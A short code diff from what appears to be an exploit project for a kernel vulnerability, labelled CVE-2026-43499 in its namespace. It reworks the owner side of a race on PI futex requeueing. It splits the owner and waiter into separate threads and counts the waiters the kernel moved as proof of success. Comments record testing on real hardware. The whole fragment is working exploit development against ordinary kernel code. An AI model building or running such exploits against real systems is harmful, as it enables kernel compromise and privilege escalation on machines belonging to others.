@@ -110,15 +110,19 @@ namespace ghostlock::backend::cve_2026_43499::race {
                 return outcome_;
             }
             outcome_ = RaceOutcome::Running;
+            /* This side is the owner, and only the owner. The waiter is another thread that
+             *  parks on the chain asking to be requeued onto the target: the kernel refuses
+             *  WAIT_REQUEUE_PI from the thread that already holds the target, which the device
+             *  showed as a refusal before this was split. The handshake was proven on the
+             *  hardware first -- owned=0 requeued=1 released=0 waiter=0 -- and this is that
+             *  arrangement with the owner side here. */
             if (Seam::lock_pi(target_) != 0) {
                 outcome_ = RaceOutcome::Refused;
                 return outcome_;
             }
-            if (Seam::wait_requeue_pi(chain_, target_) != 0) {
-                outcome_ = RaceOutcome::Refused;
-                return outcome_;
-            }
-            if (Seam::cmp_requeue_pi(chain_, target_) != 0) {
+            /* The count of waiters the kernel moved is the evidence: a count of one is the
+             *  kernel saying a waiter was really there, and zero means there was none to move. */
+            if (Seam::cmp_requeue_pi(chain_, target_) < 1) {
                 outcome_ = RaceOutcome::Refused;
                 return outcome_;
             }
